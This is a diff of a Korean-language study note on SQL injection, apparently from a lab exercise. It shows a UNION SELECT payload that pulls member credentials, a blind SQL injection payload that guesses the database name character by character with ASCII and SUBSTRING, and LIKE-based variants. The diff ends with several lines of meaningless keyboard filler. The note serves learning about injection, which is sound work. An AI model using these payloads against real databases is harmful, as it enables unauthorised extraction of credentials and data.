@@ -114,6 +114,7 @@ UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL FROM member--
 쿼리 결과가 **참/거짓**인지에 따라 정보를 획득하는 공격 기법.
 
 
+![](../Images/Pasted%20image%2020260730093626.png)
 ```sql
 attacker' and 1=1--   -- 참 구문
 attacker' and 1=2--   -- 거짓 구문
@@ -122,6 +123,25 @@ attacker' and 1=2--   -- 거짓 구문
 substring('abcdef',1,2); -> ab
 substring('abcdef',2,1); -> b
 
+attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS VARCHAR(20)),6,1)) >= ASCII('a')--
+
+
+-- dm_name의 첫 개행을 a보다 클 경우 모두 true를 반환하여 DB 구문을 공격하는 기법
+-- ASCII 'a'보다 작지 않는 특수문자를 제외한 모두 true 값 반환
+
+
+첫 글자 l.. -> 노가다로 'lecture' db name get!!
+
+```
+**다른 구문
+%' and 'a%'='a
+%' and '1%'='1
+
+
+ddsfsasd
+dfasdfa
+dfasdf
+asdfadsf
 
 
 
